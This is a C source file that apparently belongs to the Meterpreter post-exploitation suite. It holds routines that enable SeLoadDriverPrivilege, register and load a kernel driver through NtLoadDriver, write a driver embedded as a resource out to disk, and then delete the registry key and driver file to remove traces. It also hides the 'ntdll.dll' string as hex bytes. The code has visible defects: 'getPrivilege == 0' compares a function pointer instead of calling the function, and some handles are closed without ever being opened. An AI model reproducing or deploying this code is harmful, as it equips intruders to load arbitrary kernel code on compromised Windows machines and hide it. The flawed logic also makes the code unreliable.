/*!
* @file driver.c
* @brief Definitions of driver handler components for the Meterpreter suite.
* @details Contains routines required to load device drivers for Windows platform
*/
//#include "common.h"
#include "precomp.h"
#include <shlwapi.h>

VOID(NTAPI *RtlInitUnicodeString)(_PUNICODE_STRING, PCWSTR);
const char ntDll[] = { 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c, 0x00 };

int getPrivilege() {
	TOKEN_PRIVILEGES privToken;
	HANDLE hToken;

	privToken.PrivilegeCount = 1;
	privToken.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (LookupPrivilegeValueW(NULL, L"SeLoadDriverPrivilege", &privToken.Privileges[0].Luid)) {
		if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
			if (AdjustTokenPrivileges(hToken, FALSE, &privToken, sizeof(privToken), NULL, NULL)) {
				CloseHandle(hToken);
				return 0;
			}
		}
		CloseHandle(hToken);
	}
	return 1;
}

int createRegKey(PCWSTR driverPath, PCWSTR driverKey) {
	HKEY keyHandle;
	DWORD createResult;
	DWORD svcType = 1;
	DWORD svcErrorControl = 1;
	DWORD svcStart = 3;

	if (!RegCreateKeyExW(HKEY_LOCAL_MACHINE, (LPWSTR)driverKey, 0, NULL, 0, KEY_ALL_ACCESS, NULL, &keyHandle, &createResult)){
		if (!RegSetValueExW(keyHandle, L"ImagePath", 0, REG_EXPAND_SZ, (const BYTE *)driverPath, (DWORD)(lstrlenW(driverPath) + 1) * sizeof(WCHAR))){
			if (!RegSetValueExW(keyHandle, L"Type", 0, REG_DWORD, (const BYTE *)&svcType, sizeof(DWORD))) {
				if (!RegSetValueExW(keyHandle, L"Start", 0, REG_DWORD, (const BYTE *)&svcStart, sizeof(DWORD))){
					RegCloseKey(keyHandle);
					return 0;
				}
			}
		}
	}
	RegCloseKey(keyHandle);
	return 1;
}

int deleteRegKey(PCWSTR driverKey) {
	HKEY keyHandle;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, (LPWSTR)driverKey, 0, KEY_ALL_ACCESS, &keyHandle) == ERROR_SUCCESS) {
		if (SHDeleteKey(keyHandle, NULL) == ERROR_SUCCESS) {
			if (RegCloseKey(keyHandle) == ERROR_SUCCESS) {
				if (RegDeleteKeyExW(HKEY_LOCAL_MACHINE, (LPWSTR)driverKey, KEY_ALL_ACCESS, 0) == ERROR_SUCCESS) {
					return 0;
				}
			}
		}
	}
	RegCloseKey(keyHandle);
	return 1;
}


NTSTATUS driverLoad(PCWSTR driverPath, PCWSTR driverKey) {
	NTSTATUS(NTAPI *NtLoadDriver)(_PUNICODE_STRING);
	NTSTATUS loadResult;
	if ((getPrivilege == 0) && (createRegKey(driverPath, driverKey) == 0)) {
		*(FARPROC *)&RtlInitUnicodeString = GetProcAddress(GetModuleHandleA(ntDll), "RtlInitUnicodeString");
		*(FARPROC *)&NtLoadDriver = GetProcAddress(GetModuleHandleA(ntDll), "NtLoadDriver");
		_UNICODE_STRING regPath;
		RtlInitUnicodeString(&regPath, driverKey);
		loadResult = NtLoadDriver(&regPath);
		if (!deleteRegKey(driverKey)) {
			if (DeleteFileW(driverPath)) {
				// cleanup failed
			}
		}
		return loadResult;
	}
	return (NTSTATUS)0x00000001L;
}

NTSTATUS driverUnload(PCWSTR driverPath, PCWSTR driverKey) {
	NTSTATUS(NTAPI *NtUnloadDriver)(_PUNICODE_STRING);
	NTSTATUS unloadResult;
	if ((getPrivilege == 0) && (createRegKey(driverPath, driverKey) == 0)) {
		*(FARPROC *)&RtlInitUnicodeString = GetProcAddress(GetModuleHandleA(ntDll), "RtlInitUnicodeString");
		*(FARPROC *)&NtUnloadDriver = GetProcAddress(GetModuleHandleA(ntDll), "NtUnloadDriver");
		_UNICODE_STRING regPath;
		RtlInitUnicodeString(&regPath, driverKey);
		unloadResult = NtUnloadDriver(&regPath);
		if (!deleteRegKey(driverKey)) {
			if (DeleteFileW(driverPath)) {
				// cleanup failed or driver is already gone
			}
		}
		return unloadResult;
	}
	return (NTSTATUS)0x00000001L;
}

DWORD dropDriverResource(int name, LPCTSTR rtype, PCWSTR driverPath) {
	HANDLE destFile;
	HMODULE handle = GetModuleHandle(NULL);
	HRSRC rc = FindResource(handle, MAKEINTRESOURCE(name), rtype);
	HGLOBAL rcData = LoadResource(handle, rc);
	DWORD res = ERROR_SUCCESS, offset = 0, written = 0, size = SizeofResource(handle, rc);
	char *buffer = (char *)malloc(size + 1);
	memcpy(buffer, (const char*)(LockResource(rcData)), size);
	if ((destFile = CreateFileW(driverPath, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		res = GetLastError();
	}
	else {
		while ((size) && (WriteFile(destFile, buffer + offset, size, &written, NULL))) {
			size -= written;
			offset += written;
		}
		CloseHandle(destFile);
	}
	free(buffer);
	FreeLibrary(handle);
	return res;
}